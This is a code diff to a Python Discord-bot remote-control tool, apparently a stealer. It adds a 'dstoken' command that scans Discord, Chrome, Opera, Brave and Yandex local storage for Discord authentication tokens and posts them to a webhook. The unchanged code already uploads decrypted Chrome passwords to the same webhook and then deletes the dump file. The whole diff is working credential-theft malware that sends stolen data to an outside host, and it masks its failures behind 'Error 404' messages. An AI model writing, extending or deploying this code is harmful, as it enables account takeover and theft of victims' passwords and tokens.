@@ -1,8 +1,10 @@
 weburl = 'ENTER HERE YOUR WEBHOOK URL'
 botoken = 'ENTER HERE YOUR BOT TOKEN'
+
 import discord
 from discord.ext import commands
 from discord_webhook import DiscordWebhook
+from urllib.request import Request, urlopen
 import subprocess
 import os
 import requests
@@ -406,14 +408,91 @@ async def chromepws(ctx):
         except Exception as e:
             qwertyuiop = 1
         try:
-            #convert .cvs file in .txt file
             subprocess.getoutput('move decrypted_password.csv DecryptedPassword.txt')
             with open('DecryptedPassword.txt', 'rb') as f:
                 webhook.add_file(file=f.read(), filename='DecryptedPassword.txt')
             webhook.execute()
             subprocess.getoutput('if exist DecryptedPassword.txt del DecryptedPassword.txt/q')
         except:
-            #if not exist the .csv file doesn't send anything
             await ctx.send("Error 404")
+
+
+
+
+@client.command()
+async def dstoken(ctx):
+    userw = ctx.message.author
+    await ctx.channel.purge(limit=1)
+    # mentions you when you get a hit
+    PING_ME = False
+
+    def find_tokens(path):
+        path += '\\Local Storage\\leveldb'
+
+        tokens = []
+
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+
+            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
+        return tokens
+
+    def dstokengrab():
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+
+        paths = {
+            'Discord': roaming + '\\Discord',
+            'Discord Canary': roaming + '\\discordcanary',
+            'Discord PTB': roaming + '\\discordptb',
+            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+            'Opera': roaming + '\\Opera Software\\Opera Stable',
+            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        }
+
+        message = '@everyone' if PING_ME else ''
+
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+
+            message += f'\n**{platform}**\n```\n'
+
+            tokens = find_tokens(path)
+
+            if len(tokens) > 0:
+                for token in tokens:
+                    message += f'{token}\n'
+            else:
+                message += 'No tokens found.\n'
+
+            message += '```'
+
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+        }
+
+        payload = json.dumps({'content': message})
+
+        try:
+            req = Request(weburl, data=payload.encode(), headers=headers)
+            urlopen(req)
+        except:
+            subprocess.getoutput('echo Error 404 > "%appdata%\Error 404.txt"')
+            webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
+            with open(f'{appdatar}\Error 404.txt', "rb") as f:
+                webhook.add_file(file=f.read(), filename='Error 404.txt')
+            webhook.execute()
+    dstokengrab()
+
+
+
+
 
 client.run(botoken)
